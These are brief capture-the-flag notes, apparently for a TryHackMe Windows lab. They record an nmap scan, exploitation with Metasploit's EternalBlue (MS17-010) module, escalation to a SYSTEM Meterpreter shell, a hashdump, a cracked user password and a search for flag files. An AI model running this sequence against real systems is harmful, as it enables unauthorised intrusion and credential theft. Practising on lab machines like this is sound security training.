# Windows Machine
# Has MS17-020 Vulnerability
# Nmap Scan
nmap -sC -sV -A -p- -T4 <ip>
# 3 Ports Were Open
# Ports Not Useful
# Metasploit
# Exploited MS17-010
# Exploit Completed But No Session Was Created
# Tried Using TryHackMe AttackBox
# Same Procedure
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <ip>
# Worked
# Shell Opened
# Used post/multi/manage/shell_to_meterpreter
# Got Meterpreter Shell (Authority/System)
hashdump
# Got Non-Default User Jon
# Cracked His Password
# Password Was alqfna22
# Found Flags Using:
search -f flag*.*
# Found 3 Flags
# Completed!!!